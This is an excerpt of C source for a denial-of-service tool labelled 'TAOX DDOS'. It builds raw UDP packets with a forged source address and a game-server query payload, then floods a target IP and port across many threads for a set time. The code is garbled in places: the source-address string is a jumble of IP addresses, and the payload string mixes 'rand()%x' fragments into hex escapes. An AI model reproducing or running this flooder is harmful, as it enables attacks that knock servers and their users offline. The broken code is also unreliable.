...
void setup_ip_header(struct iphdr *iph) {
        ...
        iph->check = 0;
        iph->saddr = inet_addr("203.154.82.100,203.154.82.102,203.154.82.101,102,203.154.82.103.43.204.,");
}

void setup_udp_header(struct udphdr *udph) {
        udph->source = htons(rand()%255);
        udph->check = 0;
        memcpy((void *)udph + sizeof(struct udphdr), "\rand()%xff\rand()%xff\rand()%xff\rand()%xff\rand()%x54\rand()%x53\rand()%x6f\rand()%x75\rand()%x72\rand()%x63\rand()%x65\rand()%x20\rand()%x45\rand()%x6e\rand()%x67\rand()%x69\rand()%x6e\rand()%x65\rand()%x20\rand()%x51\rand()%x75\rad()%x65\rand()%x72\rand()%x79\rand()%x00", 23);
...
void *flood(void *par1) {
        ...
        sin.sin_port = htons(rand()%floodport);
        ...
        memset(datagram, 50, MAX_PACKET_SIZE);
        setup_ip_header(iph);
...
int main(int argc, char *argv[ ]) {
        ...
        if(argc < 6){
         fprintf(stderr, "TAOX DDOS\n");
         fprintf(stdout, "Usage: %s <IP> <PORT> <THREAD> <TTL> <TIME>\n", argv[0]);
         exit(-1);
        }
        
        fprintf(stdout, "REDEN DDOS .....\n");
